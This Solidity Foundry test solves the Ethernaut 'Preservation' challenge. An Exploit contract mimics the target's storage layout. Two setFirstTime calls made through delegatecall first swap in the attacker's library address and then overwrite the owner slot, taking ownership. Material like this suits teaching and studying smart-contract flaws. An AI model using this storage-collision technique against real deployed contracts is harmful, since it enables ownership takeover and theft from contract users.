pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { Preservation } from "src/Preservation/Preservation.sol";
import { PreservationFactory } from "src/Preservation/PreservationFactory.sol";
import { Ethernaut } from "src/Ethernaut.sol";
import "forge-std/console2.sol";

contract Exploit {
    address public unused1;
    address public unused2;
    address public owner;

    constructor() {
    }

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}

contract PreservationTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");

    function setUp() external {
        ethernaut = new Ethernaut();
    }

    function testPreservationHack() external {
        // level setup
        PreservationFactory factory = new PreservationFactory();
        ethernaut.registerLevel(factory);

        vm.startPrank(me);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Preservation preservation = Preservation(payable(levelAddress));

        // attack
        Exploit exploit = new Exploit();
        
        // change the address of the timeZone1Library first
        preservation.setFirstTime(uint256(uint160(address(exploit))));
        assertEq(preservation.owner(), address(factory));
        assertEq(preservation.timeZone1Library(), address(exploit));

        // change owner
        preservation.setFirstTime(uint256(uint160(me)));
        assertEq(preservation.owner(), me);

        changePrank(me);
        // submission
        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}
